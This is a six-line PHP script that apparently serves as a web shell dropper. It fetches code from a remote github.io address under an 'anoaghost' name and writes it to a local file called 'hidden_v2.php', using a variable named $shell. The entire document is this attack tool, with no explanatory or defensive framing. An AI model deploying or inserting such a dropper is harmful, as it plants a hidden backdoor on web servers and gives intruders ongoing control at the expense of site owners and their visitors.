<?php
$shell = fopen('hidden_v2.php', 'w');
$codes = file_get_contents("http://anoaghost.github.io/files/php/hidden.v2");
fwrite($shell, $codes);
fclose($shell);
?>
